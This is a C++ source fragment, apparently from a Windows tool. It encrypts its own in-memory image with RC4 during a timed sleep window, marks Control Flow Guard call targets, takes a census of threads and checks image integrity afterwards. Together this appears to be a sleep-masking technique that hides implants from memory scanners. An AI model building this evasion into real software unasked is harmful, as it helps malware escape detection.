        MaskStepTrace("step: chain queued");
        MASK_TRACE("chain queued: steps=%zu encDue=%lu decDue=%lu doneDue=%lu",
            plan.size(), static_cast<unsigned long>(encDue),
            static_cast<unsigned long>(decDue), static_cast<unsigned long>(doneDue));

        // ---- ④ 放行 + 等待（返回时镜像已解密） ----
        if (preQueueSnap) {
            preQueueSnap->resize(static_cast<size_t>(img.size));
            std::memcpy(preQueueSnap->data(), reinterpret_cast<const void*>(img.base),
                preQueueSnap->size());
        }
        const uint64_t t0 = ::GetTickCount64();
        ::SetEvent(guard.ev[1]);
        MaskStepTrace("step: released, waiting done");
        MASK_TRACE("released, waiting done (timeout=%lu)",
            static_cast<unsigned long>(static_cast<DWORD>(windowMs) + kDoneGuardMs));
        const DWORD waited = ::WaitForSingleObject(guard.ev[2],
            static_cast<DWORD>(windowMs) + kDoneGuardMs);
        elapsedMs = ::GetTickCount64() - t0;
        MASK_TRACE("done wait=%lu elapsed=%llums", static_cast<unsigned long>(waited),
            static_cast<unsigned long long>(elapsedMs));
        if (waited != WAIT_OBJECT_0) {
            err = "窗口完成事件超时(链未按预期执行)";
            return false;
        }
        return true;
    }

} // namespace

// ---------------- 门面 ----------------

class MaskRuntimeWin final : public IMaskRuntime {
public:
    bool Supported() const override { return true; }

    bool SelfTest(bool execute, uint32_t windowMs, const std::vector<uint32_t>& allowTids,
        MaskSelfTestReport& out, std::string& err) override {
        out.supported = true;

        if (!EnsureResolved(err)) {
            out.missingExport = resolveMissing_;
            out.note = "掩码原语解析失败";
            return false;
        }
        out.primitivesOk = true;

        std::vector<ImageRegion> regions;
        if (!BuildImage(out.image, regions, err)) {
            return false;
        }
        if (!Census(api_, allowTids, out.image, out.threads,
                out.foreignInImageCount, out.unknownStartCount, err)) {
            return false;
        }
        if (!Rc4RoundTrip(api_, err)) {
            return false;
        }
        out.rc4RoundTripOk = true;
        MaskStepTrace("step: rc4 roundtrip ok");

        if (!execute) {
            out.note = "干跑完成(未执行窗口)";
            return true;
        }
        if (out.foreignInImageCount > 0) {
            err = "拒绝执行: 存在镜像内名单外线程(见普查)";
            return false;
        }
        if (!cfgMarked_) {   // CFG 标记: 一次性(进程 CFG 位图, 标记后永久有效)
            if (!EnsureCallTargetsValid(api_, err)) {
                return false;
            }
            cfgMarked_ = true;
        }

        MaskStepTrace("step: hash+snapshot taken, entering RunWindow");
        out.windowMs = (windowMs < kMinWindowMs) ? kMinWindowMs : windowMs;
        out.hashBefore = HashImage(out.image);
        // 完整性诊断快照: 失败时逐页比对定位"谁在窗口期写了镜像"(12MB 级一次性
        // 开销, 仅窗口执行路径; 探针/自测命令可接受, MaskedSleep 常态路径同样承受 ——
        // 堆分配 + memcpy ~几 ms, 相对秒级窗口可忽略)
        std::vector<uint8_t> snap0;
        std::vector<uint8_t> preQueue;
        {
            snap0.resize(static_cast<size_t>(out.image.size));
            std::memcpy(snap0.data(), reinterpret_cast<const void*>(out.image.base),
                snap0.size());
        }
        if (!RunWindow(api_, out.image, regions, out.windowMs, err, out.elapsedMs, &preQueue)) {
            return false;
        }
        out.hashAfter = HashImage(out.image);
        out.executed = true;
        // 完整性语义: hashBefore==hashAfter 在**活进程**不可达
        // —— 空闲本底就有 ~3B/s 的镜像数据抖动(CRT per-thread/locale 状态 +
        // openssl 静态表, 空闲探针实测 14B/5s/3 页), 加解密之间的明文期抖动同样
        // 计入差值。真正的"密文期损坏"签名是**整页 keystream 垃圾**(任何窗口内的
        // 镜像内执行/写入都远超此量级)。故判定改为: 密文期差异 ≤ 容忍(64B)。
        // preQueueDiff(windowDiff)分别量化两段, diffRanges 给字节级定位。
        out.integrityOk = (out.windowDiffBytes <= kWindowChurnToleranceBytes);
        if (!out.integrityOk && !snap0.empty()) {
            // 分相差异: 阶段1 = 快照0 → 排队前(普查/RC4/建链, 全明文);
            //          阶段2 = 排队前 → 解密返回(屏障/加密/过窗/解密)。
            const uint8_t* now = reinterpret_cast<const uint8_t*>(out.image.base);
            auto countDiff = [](const uint8_t* a, const uint8_t* b, size_t n) {
                uint64_t d = 0;
                for (size_t i = 0; i < n; ++i) {
                    d += (a[i] != b[i]) ? 1 : 0;
                }
                return d;
            };
            out.preQueueDiffBytes = countDiff(snap0.data(), preQueue.data(), snap0.size());
            out.windowDiffBytes = countDiff(preQueue.data(), now, snap0.size());
            // 页粒度区间 + 字节级首差异(定位到具体写了什么)
            // windowDiffBytes>0 时, 区间按"排队前 vs 最终"计算(写手在密文期活动)
            const uint8_t* baseA = (out.windowDiffBytes > 0) ? preQueue.data() : snap0.data();
            constexpr size_t kPage = 4096;
            constexpr size_t kMaxRanges = 32;
            bool inRange = false;
            MaskSelfTestReport::DiffRange cur{};
            for (size_t off = 0; off < snap0.size(); off += kPage) {
                const size_t n = (std::min)(kPage, snap0.size() - off);
                const int cmp = std::memcmp(baseA + off, now + off, n);
                if (cmp != 0) {
                    if (!inRange) {
                        inRange = true;
                        cur = { off, 0, off, 0, 0 };
                        for (size_t k = 0; k < n; ++k) {
                            if (baseA[off + k] != now[off + k]) {
                                cur.firstDiff = off + k;
                                std::memcpy(&cur.beforeHead, baseA + cur.firstDiff, 8);
                                std::memcpy(&cur.afterHead, now + cur.firstDiff, 8);
                                break;
                            }
                        }
                    }
                    cur.bytes += n;
                }
                else if (inRange) {
                    inRange = false;
                    if (out.diffRanges.size() < kMaxRanges) {
                        out.diffRanges.push_back(cur);
                    }
                }
            }
            if (inRange && out.diffRanges.size() < kMaxRanges) {
                out.diffRanges.push_back(cur);
            }
        }
        out.note = out.integrityOk
            ? "窗口执行完成(密文期写在本底容忍内, 往返无损)"
            : "密文期镜像写超出容忍(疑似窗口内执行/写入, 见 diffRanges)";
        return true;
    }

private:
    bool EnsureResolved(std::string& err) {
        if (resolved_) {
            return true;
        }
        if (!api_.Resolve(resolveMissing_)) {
            err = "掩码原语解析失败: " + resolveMissing_;
            return false;
        }
        resolved_ = true;
        return true;
    }

    WinApi api_;
    bool resolved_ = false;
    bool cfgMarked_ = false;
    std::string resolveMissing_;
};

std::unique_ptr<IMaskRuntime> CreateMaskRuntime() {
    return std::make_unique<MaskRuntimeWin>();
}

} // namespace cleat
